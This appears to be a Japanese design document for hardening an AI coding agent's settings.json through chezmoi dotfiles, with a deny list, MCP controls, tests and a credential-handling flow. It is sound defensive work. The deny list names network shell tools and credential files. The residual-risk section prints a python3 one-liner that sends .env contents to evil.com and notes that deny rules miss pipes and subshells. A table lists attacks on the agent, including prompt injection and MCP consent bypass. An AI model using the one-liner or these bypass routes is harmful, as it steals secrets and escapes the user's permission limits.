# Technical Design: claude-code-security-dotfiles

## Overview

**Purpose**: Claude Code の `~/.claude/settings.json` にセキュリティ設定（deny リスト、MCP 制御）を追加し、chezmoi dotfiles で版管理・展開する。managed settings による bypass 防止も初回セットアップとして対応する。

**Users**: dotfiles を chezmoi で管理する開発者が、AI エージェント環境のセキュリティ境界を一貫して適用する。

**Impact**: 既存の `home/dot_claude/settings.json`（allow のみ）を拡張し、deny リストと MCP 制御を追加。

### Goals
- Claude Code の攻撃面を deny リストで縮小する
- MCP 自動許可を無効化する
- セキュリティ設定を chezmoi で版管理・再現可能にする
- Bats テストで設定の退行を自動検知する
- ADR で意思決定を記録する

### Non-Goals
- python3/node 経由のネットワーク通信の完全遮断（攻撃コスト引き上げに焦点）
- managed settings の chezmoi 自動展開（sudo 必要のため手動セットアップ）
- sandbox 設定（OS レベルの隔離は本スコープ外）
- allow リストの全面的な見直し（既存の allow は維持）

## Architecture

### Existing Architecture Analysis

現在の chezmoi dotfiles 構成:

```
home/
  dot_claude/
    settings.json          # allow のみ、deny なし
    prompts/
      CLAUDE.md
      en-coach.txt
    skills/                # 空
```

展開先: `~/.claude/settings.json`

現在の settings.json は静的 JSON（テンプレートではない）。マシン固有の値を含まないため、テンプレート化は不要。

### Architecture Pattern & Boundary Map

```mermaid
graph TB
    subgraph Chezmoi[chezmoi dotfiles]
        SettingsSrc[home/dot_claude/settings.json]
        TestFile[tests/claude.bats]
        ADRFile[docs/adr/0002]
    end

    subgraph Target[展開先]
        UserSettings[~/.claude/settings.json]
        ManagedSettings[/Library/.../managed-settings.json]
    end

    subgraph Validation[検証]
        BatsTest[make test]
        ChezmoiDiff[chezmoi diff]
    end

    SettingsSrc -->|chezmoi apply| UserSettings
    TestFile -->|bats| BatsTest
    BatsTest -->|jq 検証| UserSettings
    ChezmoiDiff -->|差分検知| UserSettings
    ManagedSettings -.->|手動セットアップ| Target
```

**Architecture Integration**:
- **Selected pattern**: 静的 JSON ファイル管理（既存パターンの踏襲）
- **Domain boundaries**: user settings（chezmoi 管理）と managed settings（手動管理）の分離
- **Existing patterns preserved**: chezmoi の `dot_` prefix 命名規則、Bats テスト、ADR フォーマット
- **New components**: `tests/claude.bats`（テストファイル）、`docs/adr/0002-claude-code-security-settings.md`（ADR）

### Technology Stack

| Layer | Choice / Version | Role in Feature | Notes |
|-------|------------------|-----------------|-------|
| Config Management | chezmoi | settings.json の版管理・展開 | 既存インフラ |
| Testing | Bats + jq | JSON 設定の検証 | jq は Homebrew で要インストール確認 |
| Documentation | Markdown (ADR) | 意思決定の記録 | ADR-0001 フォーマット踏襲 |

## Requirements Traceability

| Requirement | Summary | Components | Interfaces | Flows |
|-------------|---------|------------|------------|-------|
| 1.1 | MCP 自動許可の無効化 | SettingsJSON | `enableAllProjectMcpServers` | chezmoi apply |
| 1.2 | bypass 防止 | ManagedSettings | `disableBypassPermissionsMode` | 手動セットアップ |
| 1.3 | 既存設定の保持 | SettingsJSON | `env`, `enabledPlugins`, `permissions.allow` | chezmoi apply |
| 2.1-2.7 | 危険コマンド deny + クレデンシャル保護 | SettingsJSON | `permissions.deny[]` | chezmoi apply |
| 3.1-3.4 | dotfiles 保護 | SettingsJSON | `permissions.deny[]` (Edit パターン) | chezmoi apply |
| 4.1-4.4 | chezmoi 管理 | SettingsJSON | chezmoi apply/diff | chezmoi workflow |
| 5.1-5.5 | テスト検証 | ClaudeBats | jq クエリ | make test |
| 6.1-6.6 | ADR 作成 | ADRDocument | Markdown | - |
| 7.1-7.4 | 安全なクレデンシャル受け渡し | CredentialFlow | op run, .env.op | op run / dotenvx run |

## Components and Interfaces

| Component | Domain/Layer | Intent | Req Coverage | Key Dependencies | Contracts |
|-----------|--------------|--------|--------------|------------------|-----------|
| SettingsJSON | Config | セキュリティ設定を含む settings.json | 1.1, 1.3, 2.1-2.5, 3.1-3.4, 4.1-4.4 | chezmoi (P0) | State |
| ManagedSettings | Config | bypass 防止の managed settings | 1.2 | sudo (P0) | State |
| CredentialFlow | Config/Ops | 安全なクレデンシャル受け渡し | 7.1-7.4 | op CLI (P0), dotenvx (P1) | - |
| ClaudeBats | Testing | settings.json の検証テスト | 5.1-5.5 | jq (P0), Bats (P0) | - |
| ADRDocument | Documentation | 意思決定記録 | 6.1-6.6 | - | - |

### Config Layer

#### SettingsJSON

| Field | Detail |
|-------|--------|
| Intent | Claude Code のセキュリティ設定を定義する静的 JSON ファイル |
| Requirements | 1.1, 1.3, 2.1-2.5, 3.1-3.4, 4.1-4.4 |

**Responsibilities & Constraints**
- `permissions.deny` に危険コマンドパターンを定義する
- `enableAllProjectMcpServers: false` で MCP 自動許可を無効化する
- 既存の `env`, `permissions.allow`, `enabledPlugins` を保持する
- Claude Code 公式のパターン構文に厳密に従う

**Dependencies**
- Outbound: chezmoi — `~/.claude/settings.json` への展開 (P0)

**Contracts**: State [x]

##### State Management

settings.json の構造定義:

```json
{
  "env": {
    "ENABLE_TOOL_SEARCH": "true",
    "CLAUDE_CODE_EXPERIMENTAL_AGENT_TEAMS": "1"
  },
  "enableAllProjectMcpServers": false,
  "permissions": {
    "allow": [
      "Read",
      "Glob",
      "Grep",
      "WebSearch",
      "WebFetch",
      "TodoWrite",
      "Bash(grep:*)"
    ],
    "deny": [
      "Bash(curl *)",
      "Bash(wget *)",
      "Bash(nc *)",
      "Bash(ncat *)",
      "Bash(telnet *)",
      "Bash(rm -rf *)",
      "Bash(rmdir *)",
      "Bash(shred *)",
      "Bash(git push --force *)",
      "Bash(git push -f *)",
      "Bash(git reset --hard *)",
      "Bash(sudo *)",
      "Bash(su *)",
      "Bash(ssh *)",
      "Bash(scp *)",
      "Bash(osascript *)",
      "Bash(security *)",
      "Bash(pbcopy*)",
      "Bash(pbpaste*)",
      "Bash(* .env*)",
      "Bash(* */.env*)",
      "Bash(* ~/.ssh/*)",
      "Bash(* ~/.aws/*)",
      "Read(~/.env*)",
      "Read(**/.env*)",
      "Edit(~/.zshrc)",
      "Edit(~/.bashrc)",
      "Edit(~/.zprofile)",
      "Edit(~/.gitconfig)",
      "Edit(~/.ssh/**)",
      "Edit(~/.aws/**)",
      "Read(~/.gnupg/**)",
      "Read(~/.docker/config.json)",
      "Read(~/.npmrc)",
      "Read(~/.pypirc)",
      "Read(~/.git-credentials)",
      "Read(~/.config/gh/**)",
      "Read(~/Library/Keychains/**)",
      "Edit(~/.gnupg/**)",
      "Edit(~/.docker/config.json)",
      "Edit(~/.npmrc)",
      "Edit(~/.pypirc)",
      "Edit(~/.git-credentials)",
      "Edit(~/.config/gh/**)"
    ]
  },
  "enabledPlugins": {
    "claude-mem@thedotmack": true
  }
}
```

**deny リストのカテゴリ分類**:

| カテゴリ | パターン | 要件 |
|---------|---------|------|
| ネットワーク通信 | `Bash(curl *)`, `Bash(wget *)`, `Bash(nc *)`, `Bash(ncat *)`, `Bash(telnet *)` | 2.1 |
| 破壊的操作 | `Bash(rm -rf *)`, `Bash(rmdir *)`, `Bash(shred *)`, `Bash(git push --force *)`, `Bash(git push -f *)`, `Bash(git reset --hard *)` | 2.2 |
| 特権昇格 | `Bash(sudo *)`, `Bash(su *)`, `Bash(ssh *)`, `Bash(scp *)` | 2.3 |
| macOS 固有 | `Bash(osascript *)`, `Bash(security *)`, `Bash(pbcopy*)`, `Bash(pbpaste*)` | 2.4 |
| 機密ファイル (Bash) | `Bash(* .env*)`, `Bash(* */.env*)`, `Bash(* ~/.ssh/*)`, `Bash(* ~/.aws/*)` | 2.5 |
| 機密ファイル (Read) | `Read(~/.env*)`, `Read(**/.env*)` | 2.5 |
| dotfiles 保護 | `Edit(~/.zshrc)`, `Edit(~/.bashrc)`, `Edit(~/.zprofile)`, `Edit(~/.gitconfig)`, `Edit(~/.ssh/**)`, `Edit(~/.aws/**)` | 3.1-3.4 |
| 開発者ツール認証 (Read) | `Read(~/.gnupg/**)`, `Read(~/.docker/config.json)`, `Read(~/.npmrc)`, `Read(~/.pypirc)`, `Read(~/.git-credentials)`, `Read(~/.config/gh/**)` | 2.6 |
| 開発者ツール認証 (Edit) | `Edit(~/.gnupg/**)`, `Edit(~/.docker/config.json)`, `Edit(~/.npmrc)`, `Edit(~/.pypirc)`, `Edit(~/.git-credentials)`, `Edit(~/.config/gh/**)` | 2.6 |
| macOS クレデンシャル | `Read(~/Library/Keychains/**)` | 2.7 |

**Implementation Notes**
- `pbcopy*`/`pbpaste*` はスペースなし（コマンド名自体にマッチ、引数なしでも使用されるため）
- `Bash(* .env*)` はカレントディレクトリの `.env` にマッチ、`Bash(* */.env*)` はパス付き `.env` にマッチ
- `Read(~/.env*)` と `Read(**/.env*)` で Read ツール経由の `.env` アクセスもブロック（gitignore パターン）
- Edit パターンは gitignore 仕様: `~/.ssh/**` で再帰マッチ
- permission 評価順序は deny → ask → allow のため、deny に入れたパターンは allow で上書きされない

#### ManagedSettings

| Field | Detail |
|-------|--------|
| Intent | bypass permissions mode を無効化する managed settings |
| Requirements | 1.2 |

**Responsibilities & Constraints**
- `disableBypassPermissionsMode: "disable"` を設定する
- managed settings は Claude Code の最高優先度であり、他の設定で上書き不可
- macOS: `/Library/Application Support/ClaudeCode/managed-settings.json`
- 作成に sudo が必要

**Dependencies**
- External: macOS admin 権限 — ファイル作成 (P0)

**Contracts**: State [x]

##### State Management

managed-settings.json の構造:

```json
{
  "permissions": {
    "disableBypassPermissionsMode": "disable"
  }
}
```

**Implementation Notes**
- chezmoi の自動展開対象外（sudo 必要のため）。`setup.sh` または ADR に手動手順を記載
- 初回セットアップのみ必要（変更頻度は極めて低い）
- 詳細な判断根拠は `research.md` の「managed settings の管理方針」を参照

#### CredentialFlow

| Field | Detail |
|-------|--------|
| Intent | Claude Code に平文シークレットを渡さず、安全にクレデンシャルを利用する |
| Requirements | 7.1-7.5 |

**Responsibilities & Constraints**
- 個人クレデンシャル（Anthropic API Key, GitHub PAT 等）は `op run` で 1Password Vault から環境変数として注入
- リポジトリ/サービスキー（Stripe, DB接続文字列等）は `dotenvx` で暗号化 `.env` として管理
- `dotenvx` の復号キー（`DOTENV_PRIVATE_KEY`）は `op` で管理し、信頼の根を 1Password に一本化
- 平文の `.env` ファイルがディスク上に残らないこと

**Dependencies**
- External: op CLI v2+ — 1Password Vault からのシークレット注入 (P0)
- External: dotenvx — 暗号化 .env の管理 (P1)

**信頼チェーン**:

```
1Password Vault (信頼の根)
├── 個人キー
│   └── op run --env-file=.env.op -- claude
│       └── $ANTHROPIC_API_KEY, $GITHUB_TOKEN 等（メモリ上のみ）
│
└── DOTENV_PRIVATE_KEY
    └── dotenvx run -- <command>
        └── $STRIPE_SECRET_KEY, $DATABASE_URL 等（メモリ上のみ）
```

**.env.op テンプレート例**:

```bash
# 個人クレデンシャル（op:// 参照のみ、平文なし）
ANTHROPIC_API_KEY=op://Development/Anthropic/credential
GITHUB_TOKEN=op://Development/GitHub-PAT/credential
```

**dotenvx 利用フロー**:

```bash
# 1. プロジェクトで .env を作成・暗号化
dotenvx encrypt
# 2. .env.encrypted をリポジトリにコミット（平文 .env は gitignore）
# 3. 復号キーは op で管理
op item create --category=password --title="ProjectX DOTENV_PRIVATE_KEY" --value="..."
# 4. 実行時
op run -- dotenvx run -- claude
```

**deny ルールとの関係**:
- `Read(**/.env*)` で平文 `.env` へのアクセスをブロック（既存 deny）
- `op://` 参照の `.env.op` は平文シークレットを含まないため deny の影響なし
- `.env.encrypted` は暗号化済みのため読まれても安全

### Testing Layer

#### ClaudeBats

| Field | Detail |
|-------|--------|
| Intent | settings.json のセキュリティ設定を Bats テストで検証する |
| Requirements | 5.1-5.5 |

**Responsibilities & Constraints**
- `tests/claude.bats` として作成
- 既存の `tests/zsh.bats` と同一パターン（`Given ... then ...` 命名規則）で記述
- `make test` で既存テストと統合実行される（`tests/*.bats` glob）
- jq を使用して JSON キーを検証

**Dependencies**
- External: jq — JSON パース (P0)
- External: Bats — テストフレームワーク (P0)
- Inbound: SettingsJSON — 検証対象 (P0)

**テストケース設計**:

| テストケース | 検証内容 | jq クエリ | 要件 |
|-------------|---------|----------|------|
| JSON 形式検証 | 有効な JSON か | `jq . < file` の exit code | 5.1 |
| MCP 自動許可無効 | `enableAllProjectMcpServers == false` | `.enableAllProjectMcpServers` | 5.2 |
| deny リスト存在 | deny 配列が空でない | `.permissions.deny \| length > 0` | 5.4 |
| ネットワーク deny | curl が deny に含まれる | `.permissions.deny[] \| select(test("curl"))` | 5.4 |
| 破壊的操作 deny | rm -rf が deny に含まれる | `.permissions.deny[] \| select(test("rm -rf"))` | 5.4 |
| dotfiles 保護 | Edit(~/.zshrc) が deny に含まれる | `.permissions.deny[] \| select(test("Edit.*zshrc"))` | 5.4 |

**Implementation Notes**
- テスト対象は展開後の `~/.claude/settings.json`（chezmoi apply 後）
- 要件 5.3（`disableBypassPermissionsMode` 検証）は managed settings ファイルの存在確認で対応
- jq が未インストールの場合はテストをスキップ（`command -v jq` チェック）

### Documentation Layer

#### ADRDocument

| Field | Detail |
|-------|--------|
| Intent | セキュリティ設定を dotfiles で管理する意思決定を記録する |
| Requirements | 6.1-6.6 |

**Responsibilities & Constraints**
- `docs/adr/0002-claude-code-security-settings.md` に作成
- ADR-0001 のフォーマット（Status, Date, Context, Decision, Consequences, Alternatives Considered, Related Files）を踏襲
- Security Considerations セクションを追加（攻撃ベクトルと対策の対応表）

**ADR 構成**:

1. **Context**: AI エージェント環境の攻撃面（7つの攻撃ベクトル）
2. **Decision**: settings.json の deny リスト + MCP 制御 + managed settings
3. **Consequences**:
   - Positive: 攻撃面縮小、版管理による再現性、テストによる退行検知
   - Negative: managed settings の手動セットアップ、python3/node のバイパスリスク残存
4. **Security Considerations**: 攻撃ベクトル → deny パターンの対応表
5. **Operational Rules**: deny リスト変更時のレビュープロセス、clone 時の `.claude/` ディレクトリ検査手順、WebFetch allow の技術的根拠
6. **Future Considerations**: `/sandbox` モードとの統合、`ConfigChange` hooks による設定変更監査、PreToolUse hooks による python3/node ネットワーク通信検出
7. **Related Files**: settings.json, claude.bats, managed-settings.json

## Error Handling

### Error Strategy

| エラーシナリオ | 対処 |
|--------------|------|
| jq 未インストール | テストをスキップ（`skip` + 警告メッセージ） |
| settings.json が不正な JSON | `jq .` の exit code でテスト失敗 |
| chezmoi apply で設定が上書きされる | テストで退行検知、diff で事前確認 |
| managed settings の権限不足 | ADR に手動セットアップ手順を記載 |

## Testing Strategy

### Unit Tests（Bats）
- `tests/claude.bats` で settings.json の構造を検証
- JSON 形式、必須キー、deny リストの内容を検証
- jq を使った宣言的な検証アプローチ

### Integration Tests
- `chezmoi apply` → `chezmoi diff` で展開後の差分がないことを確認
- `make test` で全テスト（zsh.bats + claude.bats）が通ることを確認

## Security Considerations

本フィーチャーの中核がセキュリティ設定であるため、設計全体がセキュリティに関する判断で構成されている。

### 攻撃ベクトルと対策の対応

| 攻撃ベクトル | 対策 | deny パターン | 限界 |
|-------------|------|--------------|------|
| 間接プロンプトインジェクション | ネットワーク通信の deny | `Bash(curl *)`, `Bash(wget *)` 等 | python3/node 経由のバイパス（攻撃コスト差は数秒程度） |
| プロンプトサプライチェーン | MCP 自動許可の無効化 + dotfiles 保護 | `enableAllProjectMcpServers: false`, `Edit(~/.zshrc)` 等 | 悪意ある CLAUDE.md の手動承認リスク |
| MCP ツール悪用 | MCP 自動許可の無効化 | `enableAllProjectMcpServers: false` | 手動で許可した MCP は制御外 |
| クレデンシャルリーク | 機密ファイルの deny | `Bash(* .env*)`, `Bash(* ~/.ssh/*)`, `Read(~/.gnupg/**)` 等 | 環境変数経由の漏洩 |
| Hooks-Based RCE (CVE-2025-59536) | パッチ適用 + clone 時の `.claude/` 検査（運用ルール） | settings.json の deny では防御不可 | 設定レベルの対策なし。パッチ依存 + リポジトリ検査の運用で対処 |
| MCP Consent Bypass (CVE-2026-21852) | `enableAllProjectMcpServers: false` + パッチ適用 | `enableAllProjectMcpServers: false` | パッチ未適用環境では `enabledMcpjsonServers` 連携で突破される |
| APIキー窃取 (ANTHROPIC_BASE_URL) | パッチ適用 + clone 時の環境変数設定検査（運用ルール） | settings.json の deny では防御不可 | `.claude/settings.json` の `env` に `ANTHROPIC_BASE_URL` が含まれていないか検査が必要 |

### 残存リスク

- **python3/node 経由の通信**: deny リストでは完全に防げない。`python3 -c "import urllib.request; urllib.request.urlopen('https://evil.com/exfil?data=' + open('.env').read())"` のようなワンライナーで curl deny を数秒のコスト差でバイパス可能。allow リストで `Bash(python3 --version)` 等に限定する運用を推奨
- **sandbox 未使用時の deny リスト限界**: 公式ドキュメントによれば、`/sandbox` 無しでは deny ルールは Claude Code の組み込みツールのみをブロックし、パイプやサブシェル経由の間接実行は防げない可能性がある。将来的に `/sandbox` モードとの統合を検討すべき
- **WebFetch の allow**: deny リストでネットワーク通信コマンド（curl, wget）をブロックしつつ `WebFetch` を allow している。WebFetch は隔離されたコンテキストウィンドウで実行されるため（公式: "Isolated context windows"）、プロンプトインジェクションのリスクは軽減されるが、情報送信の手段としては残存する。意図的な設計判断として ADR に記録する
- **新しい攻撃手法**: deny リストは既知のパターンに基づくため、定期的な見直しが必要
- **Hooks / ANTHROPIC_BASE_URL 経由の攻撃 (CVE-2025-59536, CVE-2026-21852)**: settings.json の deny では防御不可。パッチ適用を前提とし、clone したリポジトリの `.claude/` ディレクトリと環境変数設定を検査する運用ルールを ADR に記載する
